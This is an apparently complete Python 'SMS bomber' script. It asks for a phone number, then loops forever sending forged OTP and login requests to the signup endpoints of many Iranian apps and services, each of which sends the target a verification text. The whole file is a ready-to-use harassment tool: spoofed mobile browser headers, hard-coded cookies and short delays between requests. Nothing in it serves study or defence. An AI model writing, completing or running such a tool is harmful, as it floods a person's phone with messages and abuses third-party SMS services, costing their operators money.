import requests
import time
print("""     
          _                     _   
   __ _  | |__     ___    ___  | |_ 
  / _` | | '_ \   / _ \  / __| | __|
 | (_| | | | | | | (_) | \__ \ | |_ 
  \__, | |_| |_|  \___/  |___/  \__|
  |___/                             
""")
print("""1 ==> sms bomber
""")
a = input("enter your choice: ")
if a == "1":
    print("example: 9xxxxxxxxx")
    phone = input("enter phone number: ")
    while True:
        headers = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        json = {"credential":{"phoneNumber":"0"+phone,"role":"PASSENGER"}}
        req = requests.post("https://tap33.me/api/v2/user", headers=headers, json=json)
        print(req.text)

        time.sleep(0.5)

        headers = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
        json = {"cellphone":"+98"+phone}
        req = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=headers, json=json)
        print(req.text)

        time.sleep(0.5)

        headers = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
        req = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B+98"+phone, headers=headers)
        print(req.text)

        time.sleep(0.5)

        headers = {"Host": "web.emtiyaz.app","Connection": "keep-alive","Content-Length": "28","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://web.emtiyaz.app","Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://web.emtiyaz.app/login","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
        data = "send=1&cellphone=0"+phone
        req = requests.post("https://web.emtiyaz.app/json/login", headers=headers, data=data)

        time.sleep(0.5)

        headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "Content-Type": "application/json;charset\u003dUTF-8",
        "Origin": "https://kacheb.co",
        "Referer": "https://kacheb.co/"
    }
        data = {"tell":"0"+phone,"role":"customer","secure":1}
        req = requests.post("https://server.kacheb.co/api/tell", headers = headers, json = data)
        print(req.text)
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://zhiva1.ir",
            "referer": "https://zhiva1.ir/",
        }
        json = {"phone":"0"+phone}
        req = requests.post("https://api.behtarino.com/api/v1/businesses/lqfbvhcgvy/vitrin_verification/", headers = headers, json = json)
        print(req.text)

        time.sleep(0.5)

        headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "content-type": "application/json;charset\u003dUTF-8",
        "origin": "https://logosfood.ir",
        "referer": "https://logosfood.ir/"
    }
        json = {"phone":"0"+phone}
        req = requests.post("https://api.behtarino.com/api/v1/businesses/bogiiiacsv/vitrin_verification/", headers = headers, json=json)
        print(req.text)

        time.sleep(3)

        headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "content-type": "application/json;charset\u003dUTF-8",
        "origin": "https://pastapatogh.ir.app",
        "referer": "https://pastapatogh.ir.app/",
    }
        json = {"phone":"0"+phone}
        req = requests.post("https://api.behtarino.com/api/v1/businesses/mqmkgrkwrs/vitrin_verification/", headers = headers, json=json)
        print(req.text)

        time.sleep(3)

        headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "content-type": "application/json;charset\u003dUTF-8",
        "origin": "https://sedaryekfood.ir",
        "referer": "https://sedaryekfood.ir/",
    }
        json = {"phone":"0"+phone}
        req = requests.post("https://api.behtarino.com/api/v1/businesses/cxurjiqykm/vitrin_verification/", headers = headers, json=json)
        print(req.text)

        time.sleep(3)

        headers = {"user-agent":"Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json","origin": "https://behtarino.com","referer": "https://behtarino.com/"} 
        json = {"phone":"0"+phone}
        req = requests.post("https://api.behtarino.com/api/v1/users/phone_verification/", headers = headers, json=json)
        print(req.text)

        time.sleep(3)

        headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "content-type": "application/json;charset\u003dUTF-8",
        "origin": "https://fastfood.ir.app",
        "referer": "https://fastfood.ir.app/",
    }
        json = {"phone":"0"+phone}
        req = requests.post("https://api.behtarino.com/api/v1/businesses/atifkxbvuj/vitrin_verification/", headers = headers, json=json)
        print(req.text)
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
            "origin": "https://khedmatazma.com",
            "referer": "https://khedmatazma.com/mag/carpet-cleaning-app",
        }
        data = f"phone={phone}"
        req = requests.post("https://khedmatazma.com/users/sendOtp", headers = headers, data = data)
        print(req.text)
        headers= {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", 
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://app.namademan.ir",
            "referer": "https://app.namademan.ir/phone-number",
        }
        json = {"phone":"0"+phone}
        req = requests.post("https://app.namademan.ir/api/v1/login/send_otp", headers = headers, json= json)
        print(req.text)
        headers= {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", 
        "content-type": "application/json; charset\u003dutf-8",
        "origin": "https://mobile.3soot.ir",
        "referer": "https://mobile.3soot.ir/",
        }
        json = {"userName":"0"+phone}
        req = requests.post("https://api.3soot.ir/identity/v2/Customer/Login", headers = headers, json= json)
else:
    print("ye jaro eshtebah kardi")
